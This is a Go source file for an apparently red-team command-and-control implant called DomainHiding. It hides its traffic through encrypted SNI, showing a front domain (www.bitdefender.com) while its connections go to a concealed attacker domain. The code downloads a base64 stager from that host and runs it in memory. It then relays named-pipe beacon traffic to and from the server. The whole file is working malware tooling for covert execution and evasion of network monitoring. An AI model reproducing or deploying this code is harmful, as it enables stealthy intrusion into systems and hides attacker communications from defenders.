// MIT License

// Copyright (c) 2020 Critical Start Inc., Quentin Rhoads-Herrera, Chase Dardaman, Blaise Brignac

// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:

// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.

// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package main

import (
	"DomainHiding/common"
	"encoding/base64"
	"encoding/binary"
	"log"
	"runtime"
	"strings"
	"time"
	//"bytes"
	//"crypto/rand"
	"fmt"
	//"github.com/DeimosC2/DeimosC2/lib/crypto"
	dhtls "github.com/SixGenInc/Noctilucent/tls"
	"io/ioutil"
	"net"
	"net/http"
	"github.com/Microsoft/go-winio"
)

var key string              //Key of the agent
// == Start edits ==
var frontDomain = "www.bitdefender.com"   // Front domain set to this
var port = "443"            //Port of the listener
var actualDomain = "yourdomain" // True destination domain
var pipeName = `foobar`
var isDebug = false
// == End edits ==
var modPort int


type DomainHiding struct {
	httpClient *http.Client
	Debug  bool
}
type PipeChannel struct {
	Pipe  net.Conn
	Debug bool
}


func (c *PipeChannel) ReadPipe() ([]byte, int, error) {
	sizeBytes := make([]byte, 4)
	if _, err := c.Pipe.Read(sizeBytes); err != nil {
		return nil, 0, err
	}
	size := binary.LittleEndian.Uint32(sizeBytes)
	if size > 1024*1024 {
		size = 1024 * 1024
	}
	var total uint32
	buff := make([]byte, size)
	for total < size {
		read, err := c.Pipe.Read(buff[total:])
		if err != nil {
			return nil, int(total), err
		}
		total += uint32(read)
	}
	if size > 1 && size < 1024 && c.Debug {
		log.Printf("[+] Read pipe data: %s\n", base64.StdEncoding.EncodeToString(buff))
	}
	return buff, int(total), nil
}

func (c *PipeChannel) WritePipe(buffer []byte) (int, error) {
	length := len(buffer)
	if length > 2 && length < 1024 && c.Debug {
		log.Printf("[+] Sending pipe data: %s\n", base64.StdEncoding.EncodeToString(buffer))
	}
	sizeBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(sizeBytes, uint32(length))
	if _, err := c.Pipe.Write(sizeBytes); err != nil {
		return 0, err
	}
	x, err := c.Pipe.Write(buffer)
	return x + 4, err
}

func (s *DomainHiding) getStager()([]byte, error) {
	osVersion := "86"
	if runtime.GOARCH == "amd64" {
		osVersion = "64"
	}
	targetUrl := "/arch/?file="+ osVersion + "&p=" + pipeName
	if s.Debug {
		log.Println("[+] Stager information:")
		log.Println("[+] OS: "+osVersion)
		log.Println("[+] Pipename=" + pipeName)
		log.Println(fmt.Sprintf("[+] Request url=%s", targetUrl))
	}
	resp, err := s.httpClient.Get("https://" + actualDomain + ":" + port + targetUrl)
	//resp, err := httpClient.Post(("https://" + actualDomain + ":" + port + "/robots.txt"), "application/json", bytes.NewBuffer(fullMessage))
	if err != nil {
		fmt.Println(err.Error())
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusOK {
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println(err.Error())
			return nil,err
		}
		stager, err := base64.StdEncoding.DecodeString(string(body))
		if err != nil {
			log.Println("[-] Error to get stager, exit..")
			log.Println(err)
			return nil, err
		}
		return stager, nil
	}else{
		log.Println(resp.StatusCode)
		return nil, nil
	}

	return nil, nil
}

func (s *DomainHiding) ReadFrame() ([]byte, error) {
	targetUrl := "/receive/"
	resp, err := s.httpClient.Get("https://" + actualDomain + ":" + port + targetUrl)
	if err != nil {
		fmt.Println(err.Error())
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusOK {
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Println(err.Error())
			return nil, err
		}
		if s.Debug {
			log.Println(fmt.Sprintf("[+] Request url=%s", targetUrl))
			log.Println(fmt.Sprintf("[+] Receive data =%s", string(body)))
		}
		stager, err := base64.StdEncoding.DecodeString(string(body))
		if err != nil {
			log.Println("[!] Error to get stager")
			return nil, err
		}
		return stager, nil
	}else{
		log.Println(resp.StatusCode)
		return nil, nil
	}
	return nil, nil
}

func (s *DomainHiding) WriteFrame(buffer []byte) (int, error) {
	targetUrl := "/send/"
	postData := base64.StdEncoding.EncodeToString(buffer)
	if s.Debug {
		log.Println(fmt.Sprintf("[+] Request url=%s", targetUrl))
		log.Println(fmt.Sprintf("[+] Send data: %s", base64.StdEncoding.EncodeToString(buffer)))
	}
	_, err := s.httpClient.Post("https://" + actualDomain + ":" + port + targetUrl,"application/plain", strings.NewReader(postData))
	if err != nil {
		log.Println(err.Error())
		return 0, err
	}
	return 1 , nil
}


func main() {
	esniKeysBytes, err := common.QueryESNIKeysForHostDoH("cloudflare.com", true)
	if err != nil {
		log.Println("[E] Failed to retrieve ESNI keys for host via DoH: %s", err)
	}
	esnikeys, err := dhtls.ParseESNIKeys(esniKeysBytes)
	if err != nil {
		log.Println("[E] Failed to parse ESNI keys: %s", err)
	}
	tlsConfig := &dhtls.Config{
		InsecureSkipVerify: true,
		ClientESNIKeys:     esnikeys,
		MinVersion:         dhtls.VersionTLS13, // Force TLS 1.3
		MaxVersion:         dhtls.VersionTLS13,
		ESNIServerName:     actualDomain,
		PreserveSNI:        false,
		ServerName:         frontDomain}
	var (
		conn *dhtls.Conn
	)
	httpClient := &http.Client{
		Transport: &http.Transport{
			DialTLS: func(network, addr string) (net.Conn, error) {
				conn, err = dhtls.Dial("tcp", frontDomain +":"+port, tlsConfig)
				return conn, err
			},
		},
	}

	dh := &DomainHiding{httpClient, isDebug}
	stager, _ := dh.getStager()
	if stager == nil{
		//log.Println(err.Error())
		return
	}

	common.CreateThread(stager)

	//Wait for namedpipe open
	time.Sleep(3e9)
	client, err := winio.DialPipe(`\\.\pipe\`+pipeName, nil)
	if err != nil {
		log.Printf(err.Error())
		return
	}
	defer client.Close()
	pipe := &PipeChannel{client, isDebug}

	for {
		//sleep time
		time.Sleep(1e9)
		n, _, err := pipe.ReadPipe()
		if err != nil {
			log.Printf(err.Error())
		}


		dh.WriteFrame(n)
		z, err := dh.ReadFrame()
		if err != nil {
			log.Printf(err.Error())
		}
		pipe.WritePipe(z)
	}
}
